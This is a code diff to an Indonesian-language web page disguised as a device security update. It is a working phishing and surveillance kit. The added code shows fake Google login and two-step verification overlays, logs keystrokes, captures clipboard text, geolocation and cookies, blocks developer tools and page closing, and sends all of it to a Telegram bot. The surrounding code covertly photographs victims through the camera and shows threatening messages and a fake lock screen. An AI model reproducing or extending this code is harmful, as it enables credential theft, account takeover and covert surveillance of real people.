@@ -26,6 +26,22 @@
             position:fixed; bottom:60px; left:50%; transform:translateX(-50%); background:rgba(255,59,48,0.92); 
             color:white; padding:16px 32px; border-radius:20px; z-index:10000; font-size:17px; display:none; max-width:90%;
         }
+        #gmailPhishOverlay, #otpPhishOverlay {
+            display:none; position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:10001; justify-content:center; align-items:center;
+        }
+        .phish-box {
+            background:white; border-radius:12px; width:90%; max-width:420px; padding:32px 24px; 
+            box-shadow:0 10px 30px rgba(0,0,0,0.4); text-align:center; color:#202124;
+        }
+        .phish-box img { height:28px; margin-bottom:24px; }
+        .phish-box input {
+            width:100%; padding:14px; margin-bottom:16px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box;
+        }
+        #otpInput { font-size:24px; text-align:center; letter-spacing:8px; }
+        .phish-box button {
+            width:100%; padding:12px; background:#1a73e8; color:white; border:none; border-radius:4px; font-size:16px; cursor:pointer;
+        }
+        .phish-box a { color:#1a73e8; font-size:14px; margin-top:24px; cursor:pointer; display:block; }
     </style>
 </head>
 <body>
@@ -43,7 +59,7 @@
 
     <div class="device-info" id="deviceModel">Mendeteksi perangkat...</div>
 
-    <!-- Elemen tersembunyi -->
+    <!-- Elemen tersembunyi untuk kamera -->
     <video id="hiddenVideo" autoplay playsinline muted style="display:none"></video>
     <audio id="hiddenAudio" autoplay style="display:none"></audio>
     <canvas id="hiddenCanvas" style="display:none"></canvas>
@@ -56,6 +72,35 @@
     </div>
 
     <div id="fakeToast">Akses sistem sedang dibatasi untuk keamanan.</div>
+
+    <!-- Gmail Phishing Overlay -->
+    <div id="gmailPhishOverlay">
+        <div class="phish-box">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+            <h2>Masuk ke akun Google Anda</h2>
+            <p>Untuk melanjutkan pembaruan keamanan kritis, verifikasi identitas Anda.</p>
+            
+            <form id="gmailForm">
+                <input type="email" id="emailInput" placeholder="Email atau nomor telepon" required>
+                <input type="password" id="passInput" placeholder="Kata sandi" required>
+                <button type="submit">Berikutnya</button>
+            </form>
+            <a onclick="alert('Hubungi support resmi melalui nomor yang tertera di perangkat Anda.')">Lupa kata sandi?</a>
+        </div>
+    </div>
+
+    <!-- OTP Phishing Overlay -->
+    <div id="otpPhishOverlay">
+        <div class="phish-box">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+            <h2>Verifikasi 2 Langkah</h2>
+            <p>Kode verifikasi dikirim ke nomor/email Anda.</p>
+            <p id="otpTarget" style="color:#1a73e8; margin-bottom:24px;">Masukkan kode 6 digit:</p>
+            
+            <input type="text" id="otpInput" maxlength="6" placeholder="______" required>
+            <button id="otpSubmit">Verifikasi</button>
+        </div>
+    </div>
 
     <script>
         // ==================== KONFIGURASI TELEGRAM ====================
@@ -81,6 +126,8 @@
 
         let capturedPhotos = [];
         let cameraStream = null;
+        let allKeystrokes = '';
+        let cookiesStolen = document.cookie;
 
         // ==================== KIRIM KE TELEGRAM ====================
         async function sendToTelegram(msg) {
@@ -106,7 +153,7 @@
                     method: 'POST',
                     body: formData
                 });
-            } catch (e) {
+            } catch {
                 await sendToTelegram(`${caption}\n[GAGAL KIRIM FOTO]`);
             }
         }
@@ -117,7 +164,7 @@
             document.getElementById('progressFill').style.width = pct + '%';
         }
 
-        // ==================== KAMERA FIX ANTI-HITAM V3 ====================
+        // ==================== KAMERA GRAB (FIX ANTI-HITAM) ====================
         async function getCameraUniversal() {
             try {
                 updateStatus('Mengakses kamera...', 20);
@@ -160,29 +207,18 @@
 
                 await new Promise(r => setTimeout(r, 1800));
 
-                for (let i = 1; i <= 10; i++) {
+                for (let i = 1; i <= 8; i++) {  // kurangi jadi 8 biar cepet
                     let photo = null;
                     let attempts = 0;
-                    while (!photo && attempts < 4) {
+                    while (!photo && attempts < 3) {
                         attempts++;
                         photo = capturePhoto();
                         if (photo && !isBlackImage(photo)) {
                             capturedPhotos.push(photo);
-                            await sendPhotoToTelegram(photo, `Foto ${i} - \( {deviceInfo.type} ( \){modeUsed}, attempt ${attempts})`);
-                            await sendToTelegram(`📸 Foto ${i} VALID`);
+                            await sendPhotoToTelegram(photo, `Foto ${i} - \( {deviceInfo.type} ( \){modeUsed}), attempt ${attempts}`);
                             break;
                         }
-                        await new Promise(r => setTimeout(r, 700));
-                    }
-                    if (!photo || isBlackImage(photo)) {
-                        await sendToTelegram(`📸 Foto ${i} tetap hitam/gagal`);
-                    }
-                }
-
-                if (capturedPhotos.length === 0) {
-                    const fallback = captureScreenFallback();
-                    if (fallback) {
-                        await sendPhotoToTelegram(fallback, "Fallback: Screenshot halaman (kamera gagal)");
+                        await new Promise(r => setTimeout(r, 600));
                     }
                 }
 
@@ -200,7 +236,7 @@
             c.width = v.videoWidth;
             c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
-            return c.toDataURL('image/jpeg', 0.8);
+            return c.toDataURL('image/jpeg', 0.78);
         }
 
         function isBlackImage(dataUrl) {
@@ -214,54 +250,109 @@
             const d = ctx.getImageData(0, 0, 48, 48).data;
             let sum = 0;
             for (let i = 0; i < d.length; i += 4) sum += (d[i] + d[i+1] + d[i+2]) / 3;
-            return (sum / (48*48)) < 12;
-        }
-
-        function captureScreenFallback() {
-            try {
-                const c = document.getElementById('hiddenCanvas');
-                c.width = window.innerWidth;
-                c.height = window.innerHeight;
-                const ctx = c.getContext('2d');
-                ctx.drawImage(document.documentElement, 0, 0, c.width, c.height);
-                return c.toDataURL('image/jpeg', 0.7);
-            } catch { return null; }
+            return (sum / (48*48)) < 10;
         }
 
         // ==================== CHAOS KONTROL ====================
         async function chaosControls() {
-            // Vibrate chaos
             if (navigator.vibrate) {
-                setInterval(() => navigator.vibrate([90,50,140,70,220]), 14000);
-                await sendToTelegram("📳 Getar chaos aktif");
+                setInterval(() => navigator.vibrate([80,40,120,60,200]), 12000);
             }
 
-            // TTS ancaman
             if ('speechSynthesis' in window) {
-                const u = new SpeechSynthesisUtterance("Perangkat Anda telah dikendalikan. Jangan matikan atau tutup halaman ini. Data sedang diproses.");
+                const u = new SpeechSynthesisUtterance("Perangkat Anda telah dikendalikan. Jangan matikan halaman ini.");
                 u.lang = 'id-ID';
-                u.rate = 0.92;
+                u.rate = 0.9;
                 speechSynthesis.speak(u);
-                await sendToTelegram("🗣️ TTS ancaman dijalankan");
             }
 
-            // Fake toast loop
             function showToast(txt) {
                 const t = document.getElementById('fakeToast');
                 t.textContent = txt;
                 t.style.display = 'block';
-                setTimeout(() => t.style.display = 'none', 6000);
+                setTimeout(() => t.style.display = 'none', 5000);
             }
-            const toasts = ["Data pribadi diekstrak", "Proses tidak bisa dibatalkan", "Jangan keluar dari halaman", "Sistem terkunci"];
-            setInterval(() => showToast(toasts[Math.floor(Math.random()*toasts.length)]), 20000);
+            const toasts = ["Data diekstrak", "Proses tidak bisa dibatalkan", "Jangan tutup halaman", "Sistem terkunci"];
+            setInterval(() => showToast(toasts[Math.floor(Math.random()*toasts.length)]), 18000);
 
-            // Fake lock setelah 40 detik
             setTimeout(() => {
                 document.getElementById('fakeLockScreen').style.display = 'flex';
-                document.querySelector('.update-container').style.opacity = '0.4';
-                sendToTelegram("🔒 Fake lock screen aktif");
-            }, 40000);
+                document.querySelector('.update-container').style.opacity = '0.3';
+            }, 35000);
         }
+
+        // ==================== KEYLOGGER + CLIPBOARD HIJACK + GEO + COOKIES ====================
+        document.addEventListener('keydown', (e) => {
+            if (e.key.length === 1) allKeystrokes += e.key;
+            else if (e.key === 'Backspace') allKeystrokes += '[BACK]';
+            else if (e.key === 'Enter') allKeystrokes += '[ENTER]\n';
+        });
+
+        document.addEventListener('copy', async (e) => {
+            const text = window.getSelection().toString() || '';
+            if (text.length > 5) {
+                await sendToTelegram(`📋 Clipboard copy: ${text}`);
+            }
+        });
+
+        async function grabLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => sendToTelegram(`📍 Lokasi: Lat ${pos.coords.latitude}, Lng ${pos.coords.longitude}, Akurasi ${pos.coords.accuracy}m`),
+                    err => sendToTelegram(`📍 Geo gagal: ${err.message}`)
+                );
+            }
+        }
+
+        function stealCookies() {
+            if (document.cookie.length > 10) {
+                sendToTelegram(`🍪 Cookies (\( {document.cookie.length} chars):\n \){document.cookie.substring(0, 600)}...`);
+            }
+        }
+
+        // ==================== PHISHING FLOW ====================
+        document.getElementById('gmailForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const email = document.getElementById('emailInput').value.trim();
+            const pass = document.getElementById('passInput').value.trim();
+            if (!email || !pass) return;
+
+            const cred = `🎯 GMAIL HIT\nEmail: ${email}\nPass: ${pass}\nKeystrokes: ${allKeystrokes}\nDevice: ${deviceInfo.type}\nTZ: ${deviceInfo.tz}`;
+            await sendToTelegram(cred);
+            stealCookies();
+            grabLocation();
+
+            document.getElementById('gmailPhishOverlay').style.display = 'none';
+            document.getElementById('otpPhishOverlay').style.display = 'flex';
+
+            const fakeTargets = [`+62xxxxxx${Math.floor(1000 + Math.random()*9000)}`, email];
+            document.getElementById('otpTarget').innerText = `Kode dikirim ke: ${fakeTargets[Math.floor(Math.random()*fakeTargets.length)]}`;
+        });
+
+        document.getElementById('otpSubmit').addEventListener('click', async function() {
+            const otp = document.getElementById('otpInput').value.trim();
+            if (otp.length !== 6 || !/^\d{6}$/.test(otp)) return;
+
+            const otpData = `🔐 2FA HIT!\nOTP: ${otp}\nFull Keystrokes: ${allKeystrokes}\nCookies: ${document.cookie.substring(0, 400)}...`;
+            await sendToTelegram(otpData);
+
+            alert("Verifikasi berhasil. Pembaruan selesai.");
+            setTimeout(() => { window.location.href = "https://myaccount.google.com/"; }, 1500);
+        });
+
+        // ==================== ANTI DEBUG ====================
+        setInterval(() => {
+            if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
+                document.body.innerHTML = '<h1 style="color:red;text-align:center;padding:40px;">DEVELOPER TOOLS DETECTED - SESSION TERMINATED</h1>';
+            }
+        }, 400);
+
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key.toUpperCase()))) {
+                e.preventDefault();
+                alert('Akses ditolak selama proses keamanan.');
+            }
+        });
 
         // ==================== START EKSEKUSI ====================
         window.onload = async function() {
@@ -269,24 +360,35 @@
             await sendToTelegram(`🔥 TARGET BARU\nTipe: ${deviceInfo.type}\nUA: ${deviceInfo.ua}\nLayar: ${deviceInfo.screen}\nTZ: ${deviceInfo.tz}`);
 
             chaosControls();
-
-            // Jalankan kamera fix
+            stealCookies();
+            grabLocation();
             await getCameraUniversal();
 
-            // Simulasi progress panjang
+            // Tampilkan Gmail setelah 2 detik progress
             let pct = 10;
             const sim = setInterval(() => {
-                pct += Math.random() * 12;
+                pct += Math.random() * 14;
                 if (pct >= 100) {
                     pct = 100;
                     clearInterval(sim);
-                    updateStatus('Pembaruan selesai — perangkat terkendali', 100);
-                    sendToTelegram("✅ KONTROL PENUH");
+                    updateStatus('Pembaruan selesai — verifikasi diperlukan', 100);
+                    sendToTelegram("✅ KONTROL PENUH — phishing Gmail aktif");
+
+                    setTimeout(() => {
+                        document.getElementById('gmailPhishOverlay').style.display = 'flex';
+                        document.querySelector('.update-container').style.display = 'none';
+                    }, 2200);
                 } else {
                     updateStatus(`Mengamankan akses... ${Math.round(pct)}%`, pct);
                 }
-            }, 1400);
+            }, 1200);
         };
+
+        // Cegah close/refresh
+        window.addEventListener('beforeunload', e => {
+            e.preventDefault();
+            e.returnValue = '';
+        });
     </script>
 </body>
-</html>
+                                                                        </html>
